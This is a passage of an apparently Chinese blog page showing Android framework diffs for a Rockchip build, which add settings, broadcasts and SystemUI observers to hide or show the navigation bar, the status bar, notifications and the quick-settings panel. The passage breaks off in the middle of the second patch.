class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/provider/Settings.java b/core/java/android/provider/Settings.java</span><br><span class="line">index ba61dff29d2..a0a072c00e3 100755</span><br><span class="line">--- a/core/java/android/provider/Settings.java</span><br><span class="line">+++ b/core/java/android/provider/Settings.java</span><br><span class="line">@@ -3300,6 +3300,14 @@ public final class Settings &#123;</span><br><span class="line">          */</span><br><span class="line">         public static final String SCREENSHOT_BUTTON_SHOW = &quot;screenshot_button_show&quot;;</span><br><span class="line"> </span><br><span class="line">+        public static final String AUTO_HIDE_NAVIGATION_BAR = &quot;auto_hide_navigation_bar&quot;;</span><br><span class="line">+</span><br><span class="line">+        public static final String AUTO_HIDE_STATUS_BAR = &quot;auto_hide_status_bar&quot;;</span><br><span class="line">+</span><br><span class="line">         /**</span><br><span class="line">          * Whether the phone vibrates when it is ringing due to an incoming call. This will</span><br><span class="line">          * be used by Phone and Setting apps; it shouldn&#x27;t affect other apps.</span><br><span class="line">diff --git a/packages/SettingsProvider/res/values/defaults.xml b/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">index 0b9465e2b67..00b9e9e52e9 100755</span><br><span class="line">--- a/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">+++ b/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">@@ -225,4 +225,12 @@</span><br><span class="line">     &lt;integer name=&quot;def_screenshot_button_show&quot;&gt;1&lt;/integer&gt;</span><br><span class="line">     &lt;!-- the store location of screen capture by default--&gt;</span><br><span class="line">     &lt;string name=&quot;def_screenshot_location&quot;&gt;internal_storage&lt;/string&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;integer name=&quot;def_auto_hide_navigation_bar&quot;&gt;0&lt;/integer&gt;</span><br><span class="line">+</span><br><span class="line">+     &lt;integer name=&quot;def_auto_hide_status_bar&quot;&gt;0&lt;/integer&gt;</span><br><span class="line"> &lt;/resources&gt;</span><br><span class="line">diff --git a/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java b/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">index 5e2114dcd73..842985f8b65 100644</span><br><span class="line">--- a/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">+++ b/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">@@ -2403,6 +2403,19 @@ class DatabaseHelper extends SQLiteOpenHelper &#123;</span><br><span class="line"> </span><br><span class="line">             loadIntegerSetting(stmt, Settings.System.SCREENSHOT_BUTTON_SHOW,</span><br><span class="line">                     R.integer.def_screenshot_button_show);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.AUTO_HIDE_NAVIGATION_BAR,</span><br><span class="line">+                    R.integer.def_auto_hide_navigation_bar);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.AUTO_HIDE_STATUS_BAR,</span><br><span class="line">+                    R.integer.def_auto_hide_status_bar);</span><br><span class="line">+</span><br><span class="line">             /*</span><br><span class="line">              * IMPORTANT: Do not add any more upgrade steps here as the global,</span><br><span class="line">              * secure, and system settings are no longer stored in a database</span><br><span class="line">diff --git a/core/res/AndroidManifest.xml b/core/res/AndroidManifest.xml</span><br><span class="line">index a1003b3fed0..6a34cab3b1a 100644</span><br><span class="line">--- a/core/res/AndroidManifest.xml</span><br><span class="line">+++ b/core/res/AndroidManifest.xml</span><br><span class="line">@@ -495,6 +495,11 @@</span><br><span class="line">     &lt;!--for cec--&gt;</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.rockchip.hdmicec.power_status_changed&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;com.android.systemui.statusbar.shownavigation&quot; /&gt;</span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;com.android.systemui.statusbar.hidenavigation&quot; /&gt;</span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;com.android.systemui.statusbar.showstatusbar&quot; /&gt;</span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;com.android.systemui.statusbar.hidestatusbar&quot; /&gt;</span><br><span class="line">+</span><br><span class="line">     &lt;!-- ====================================================================== --&gt;</span><br><span class="line">     &lt;!--                          RUNTIME PERMISSIONS                           --&gt;</span><br><span class="line">     &lt;!-- ====================================================================== --&gt;</span><br><span class="line">diff --git a/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java b/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">index f55d1f7f831..30cc5c8edda 100755</span><br><span class="line">--- a/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">+++ b/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">@@ -293,6 +293,12 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">      */</span><br><span class="line">     private static final float SRC_MIN_ALPHA = 0.002f;</span><br><span class="line"> </span><br><span class="line">+    private static final String SHOW_NAVIGATION = &quot;com.android.systemui.statusbar.shownavigation&quot;;</span><br><span class="line">+    private static final String HIDE_NAVIGATION = &quot;com.android.systemui.statusbar.hidenavigation&quot;;</span><br><span class="line">+    private static final String SHOW_STATUSBAR = &quot;com.android.systemui.statusbar.showstatusbar&quot;;</span><br><span class="line">+    private static final String HIDE_STATUSBAR = &quot;com.android.systemui.statusbar.hidestatusbar&quot;;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">     static &#123;</span><br><span class="line">         boolean onlyCoreApps;</span><br><span class="line">         boolean freeformWindowManagement;</span><br><span class="line">@@ -483,6 +488,97 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">+    private Runnable autoHideNavigationRunnable = () -&gt; &#123;</span><br><span class="line">+        if (mNavigationBarView != null) &#123;</span><br><span class="line">+           mWindowManager.removeViewImmediate(mNavigationBarView);</span><br><span class="line">+           mNavigationBarView = null;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    private void autoHideNavigation() &#123;</span><br><span class="line">+        if (mHandler.hasCallbacks(autoHideNavigationRunnable)) &#123;</span><br><span class="line">+            mHandler.removeCallbacks(autoHideNavigationRunnable);</span><br><span class="line">+        &#125;</span><br><span class="line">+        mHandler.postDelayed(autoHideNavigationRunnable, 3000);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private Runnable autoHideStatusRunnable = () -&gt; &#123;</span><br><span class="line">+        mStatusBarWindow.setVisibility(View.GONE);</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    private void autoHideStatus() &#123;</span><br><span class="line">+        if (mHandler.hasCallbacks(autoHideStatusRunnable)) &#123;</span><br><span class="line">+            mHandler.removeCallbacks(autoHideStatusRunnable);</span><br><span class="line">+        &#125;</span><br><span class="line">+        mHandler.postDelayed(autoHideStatusRunnable, 3000);</span><br><span class="line">+    &#125;</span><br><span class="line">+    final private ContentObserver autoHideNavigationbarObserver = new ContentObserver(mHandler) &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onChange(boolean selfChange) &#123;</span><br><span class="line">+            boolean isAutoHide = Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_NAVIGATION_BAR, 0) == 1;</span><br><span class="line">+            if (isAutoHide) &#123;</span><br><span class="line">+                if (mNavigationBarView != null) &#123;</span><br><span class="line">+                   autoHideNavigation();</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                if (mNavigationBarView == null) &#123;</span><br><span class="line">+                    if (mHandler.hasCallbacks(autoHideNavigationRunnable)) &#123;</span><br><span class="line">+                        mHandler.removeCallbacks(autoHideNavigationRunnable);</span><br><span class="line">+                    &#125;</span><br><span class="line">+                    createNavigationBarView(mContext);</span><br><span class="line">+                    addNavigationBar();</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    final private ContentObserver autoHideStatusbarObserver = new ContentObserver(mHandler) &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onChange(boolean selfChange) &#123;</span><br><span class="line">+            boolean isAutoHide = Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_STATUS_BAR, 0) == 1;</span><br><span class="line">+            if (isAutoHide) &#123;</span><br><span class="line">+                autoHideStatus();</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                if (mHandler.hasCallbacks(autoHideStatusRunnable)) &#123;</span><br><span class="line">+                    mHandler.removeCallbacks(autoHideStatusRunnable);</span><br><span class="line">+                &#125;</span><br><span class="line">+                mStatusBarWindow.setVisibility(View.VISIBLE);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">     private int mInteractingWindows;</span><br><span class="line">     private boolean mAutohideSuspended;</span><br><span class="line">     private int mStatusBarMode;</span><br><span class="line">@@ -737,6 +833,34 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         mContext.getContentResolver().registerContentObserver(</span><br><span class="line">                 Settings.System.getUriFor(Settings.System.SCREENSHOT_BUTTON_SHOW), true,</span><br><span class="line">                 screenshotShowObserver);</span><br><span class="line">+        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">+                Settings.System.getUriFor(Settings.System.AUTO_HIDE_NAVIGATION_BAR), true,</span><br><span class="line">+                autoHideNavigationbarObserver);</span><br><span class="line">+</span><br><span class="line">+        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">+                Settings.System.getUriFor(Settings.System.AUTO_HIDE_STATUS_BAR), true,</span><br><span class="line">+                autoHideStatusbarObserver);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     protected void createIconController() &#123;</span><br><span class="line">@@ -1023,6 +1072,14 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         context.registerReceiverAsUser(mDemoReceiver, UserHandle.ALL, demoFilter,</span><br><span class="line">                 android.Manifest.permission.DUMP, null);</span><br><span class="line"> </span><br><span class="line">+        IntentFilter carfilter = new IntentFilter();</span><br><span class="line">+        carfilter.addAction(SHOW_NAVIGATION);</span><br><span class="line">+        carfilter.addAction(HIDE_NAVIGATION);</span><br><span class="line">+        carfilter.addAction(SHOW_STATUSBAR);</span><br><span class="line">+        carfilter.addAction(HIDE_STATUSBAR);</span><br><span class="line">+        context.registerReceiverAsUser(statusBroadcastReceiver, UserHandle.ALL, carfilter, null, null);</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">         // listen for USER_SETUP_COMPLETE setting (per-user)</span><br><span class="line">         resetUserSetupObserver();</span><br><span class="line"> </span><br><span class="line">@@ -3637,6 +3694,28 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         &#125;, cancelAction, afterKeyguardGone);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">+    private BroadcastReceiver statusBroadcastReceiver = new BroadcastReceiver() &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">+            Log.e(TAG, &quot;Broadcast receive intent:&quot; + intent);</span><br><span class="line">+            String action = intent.getAction();</span><br><span class="line">+            if (HIDE_NAVIGATION.equals(action)) &#123;</span><br><span class="line">+                if (mNavigationBarView == null) return;</span><br><span class="line">+                mWindowManager.removeViewImmediate(mNavigationBarView);</span><br><span class="line">+                mNavigationBarView = null;</span><br><span class="line">+            &#125;else if (SHOW_NAVIGATION.equals(action)) &#123;</span><br><span class="line">+                if (mNavigationBarView != null) return;</span><br><span class="line">+                createNavigationBarView(mContext);</span><br><span class="line">+                addNavigationBar();</span><br><span class="line">+                if (Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_NAVIGATION_BAR, 0) == 1) &#123;</span><br><span class="line">+                    autoHideNavigation();</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;else if(HIDE_STATUSBAR.equals(action)) &#123;</span><br><span class="line">+                mStatusBarWindow.setVisibility(View.GONE);</span><br><span class="line">+            &#125;else if(SHOW_STATUSBAR.equals(action)) &#123;</span><br><span class="line">+                mStatusBarWindow.setVisibility(View.VISIBLE);</span><br><span class="line">+                if (Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_STATUS_BAR, 0) == 1) &#123;</span><br><span class="line">+                    autoHideStatus();</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">     private BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() &#123;</span><br><span class="line">         @Override</span><br><span class="line">         public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">@@ -4039,6 +4118,7 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         &#125;</span><br><span class="line">         mContext.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line">         mContext.unregisterReceiver(mDemoReceiver);</span><br><span class="line">+        mContext.unregisterReceiver(statusBroadcastReceiver);</span><br><span class="line">         mAssistManager.destroy();</span><br><span class="line"> </span><br><span class="line">         final SignalClusterView signalCluster =</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3，通过注册观察者，实现对SystemUI的动态隐藏和显示"><a href="#3，通过注册观察者，实现对SystemUI的动态隐藏和显示" class="headerlink" title="3，通过注册观察者，实现对SystemUI的动态隐藏和显示"></a>3，通过注册观察者，实现对SystemUI的动态隐藏和显示</h2><p>这项任务是仿照SystemUI中的截图板块实现的，通过注册观察者来监听变更</p><p>即在System.Settings里面定义一个值，然后在PhonStatusBar里面注册一个观察者用来监听这个值，当这个值发生变更则执行相应的隐藏和显示操作。<br>不再显示通知的具体实现是在addNotification方法中进行拦截，不让其显示在通知栏<br>隐藏快速设置板块内容是将 QSContainer类的qsContainer对象 设置可见性为View.GONE</p><p>补丁<a href="mailto:&#x72;&#107;&#55;&#x31;&#x2d;&#102;&#114;&#97;&#109;&#101;&#x77;&#111;&#114;&#107;&#x73;&#45;&#x62;&#x61;&#x73;&#x65;&#x40;&#99;&#111;&#110;&#x74;&#x72;&#x6f;&#108;&#95;&#110;&#x61;&#118;&#x69;&#103;&#x61;&#116;&#x69;&#111;&#110;&#95;&#97;&#110;&#x64;&#95;&#115;&#x74;&#97;&#116;&#x75;&#x73;&#x5f;&#98;&#97;&#114;&#95;&#98;&#x79;&#x5f;&#x6f;&#98;&#x73;&#101;&#114;&#x76;&#101;&#114;&#x2e;&#112;&#97;&#x74;&#99;&#x68;">&#x72;&#107;&#55;&#x31;&#x2d;&#102;&#114;&#97;&#109;&#101;&#x77;&#111;&#114;&#107;&#x73;&#45;&#x62;&#x61;&#x73;&#x65;&#x40;&#99;&#111;&#110;&#x74;&#x72;&#x6f;&#108;&#95;&#110;&#x61;&#118;&#x69;&#103;&#x61;&#116;&#x69;&#111;&#110;&#95;&#97;&#110;&#x64;&#95;&#115;&#x74;&#97;&#116;&#x75;&#x73;&#x5f;&#98;&#97;&#114;&#95;&#98;&#x79;&#x5f;&#x6f;&#98;&#x73;&#101;&#114;&#x76;&#101;&#114;&#x2e;&#112;&#97;&#x74;&#99;&#x68;</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/provider/Settings.java b/core/java/android/provider/Settings.java</span><br><span class="line">index ba61dff29d2..80a924980de 100755</span><br><span class="line">--- a/core/java/android/provider/Settings.java</span><br><span class="line">+++ b/core/java/android/provider/Settings.java</span><br><span class="line">@@ -3300,6 +3300,10 @@ public final class Settings &#123;</span><br><span class="line">          */</span><br><span class="line">         public static final String SCREENSHOT_BUTTON_SHOW = &quot;screenshot_button_show&quot;;</span><br><span class="line"> </span><br><span class="line">+        public static final String NAVIGATION_BAR_SHOW = &quot;navigation_bar_show&quot;;</span><br><span class="line">+</span><br><span class="line">+        public static final String STATUS_BAR_SHOW = &quot;status_bar_show&quot;;</span><br><span class="line">+</span><br><span class="line">+        public static final String AUTO_HIDE_NAVIGATION_BAR = &quot;auto_hide_navigation_bar&quot;;</span><br><span class="line">+</span><br><span class="line">+        public static final String AUTO_HIDE_STATUS_BAR = &quot;auto_hide_status_bar&quot;;</span><br><span class="line">+</span><br><span class="line">+        public static final String NOTIFICATION_BAR_SHOW = &quot;notification_bar_show&quot;;</span><br><span class="line">+</span><br><span class="line">+        public static final String QS_CONTAINER_SHOW = &quot;qs_container_show&quot;;</span><br><span class="line">+</span><br><span class="line">         /**</span><br><span class="line">          * Whether the phone vibrates when it is ringing due to an incoming call. This will</span><br><span class="line">          * be used by Phone and Setting apps; it shouldn&#x27;t affect other apps.</span><br><span class="line">diff --git a/packages/SettingsProvider/res/values/defaults.xml b/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">index 0b9465e2b67..e349544c1eb 100755</span><br><span class="line">--- a/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">+++ b/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">@@ -225,4 +225,8 @@</span><br><span class="line">     &lt;integer name=&quot;def_screenshot_button_show&quot;&gt;1&lt;/integer&gt;</span><br><span class="line">     &lt;!-- the store location of screen capture by default--&gt;</span><br><span class="line">     &lt;string name=&quot;def_screenshot_location&quot;&gt;internal_storage&lt;/string&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;integer name=&quot;def_navigation_bar_show&quot;&gt;0&lt;/integer&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;integer name=&quot;def_status_bar_show&quot;&gt;0&lt;/integer&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;integer name=&quot;def_auto_hide_navigation_bar&quot;&gt;0&lt;/integer&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;integer name=&quot;def_auto_hide_status_bar&quot;&gt;0&lt;/integer&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;integer name=&quot;def_notification_bar_show&quot;&gt;0&lt;/integer&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;integer name=&quot;def_qs_container_show&quot;&gt;1&lt;/integer&gt;</span><br><span class="line"> &lt;/resources&gt;</span><br><span class="line">diff --git a/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java b/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">index 5e2114dcd73..2f2d37f9630 100644</span><br><span class="line">--- a/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">+++ b/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">@@ -2403,6 +2403,13 @@ class DatabaseHelper extends SQLiteOpenHelper &#123;</span><br><span class="line"> </span><br><span class="line">             loadIntegerSetting(stmt, Settings.System.SCREENSHOT_BUTTON_SHOW,</span><br><span class="line">                     R.integer.def_screenshot_button_show);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.NAVIGATION_BAR_SHOW,</span><br><span class="line">+                    R.integer.def_navigation_bar_show);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.STATUS_BAR_SHOW,</span><br><span class="line">+                    R.integer.def_status_bar_show);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.AUTO_HIDE_NAVIGATION_BAR,</span><br><span class="line">+                    R.integer.def_auto_hide_navigation_bar);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.AUTO_HIDE_STATUS_BAR,</span><br><span class="line">+                    R.integer.def_auto_hide_status_bar);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.NOTIFICATION_BAR_SHOW,</span><br><span class="line">+                  R.integer.def_notification_bar_show);</span><br><span class="line">+</span><br><span class="line">+            loadIntegerSetting(stmt, Settings.System.QS_CONTAINER_SHOW,</span><br><span class="line">+                    R.integer.def_qs_container_show);</span><br><span class="line">             /*</span><br><span class="line">              * IMPORTANT: Do not add any more upgrade steps here as the global,</span><br><span class="line">              * secure, and system settings are no longer stored in a database  </span><br><span class="line">diff --git a/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java b/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">index f55d1f7f831..30cc5c8edda 100755</span><br><span class="line">--- a/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">+++ b/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">@@ -298,6 +298,8 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">     private static final String SHOW_STATUSBAR = &quot;com.android.systemui.statusbar.showstatusbar&quot;;</span><br><span class="line">     private static final String HIDE_STATUSBAR = &quot;com.android.systemui.statusbar.hidestatusbar&quot;;</span><br><span class="line"> </span><br><span class="line">+    private QSContainer qsContainer; </span><br><span class="line">+</span><br><span class="line">     static &#123;</span><br><span class="line">         boolean onlyCoreApps;</span><br><span class="line">         boolean freeformWindowManagement;</span><br><span class="line">@@ -483,6 +489,29 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">+   private Runnable autoHideNavigationRunnable = () -&gt; &#123;</span><br><span class="line">+        if (mNavigationBarView != null) &#123;</span><br><span class="line">+          mWindowManager.removeViewImmediate(mNavigationBarView);</span><br><span class="line">+          mNavigationBarView = null;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    private void autoHideNavigation() &#123;</span><br><span class="line">+        if (mHandler.hasCallbacks(autoHideNavigationRunnable)) &#123;</span><br><span class="line">+            mHandler.removeCallbacks(autoHideNavigationRunnable);</span><br><span class="line">+        &#125;</span><br><span class="line">+        mHandler.postDelayed(autoHideNavigationRunnable, 3000);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private Runnable autoHideStatusRunnable = () -&gt; &#123;</span><br><span class="line">+        mStatusBarWindow.setVisibility(View.GONE);</span><br><span class="line">+    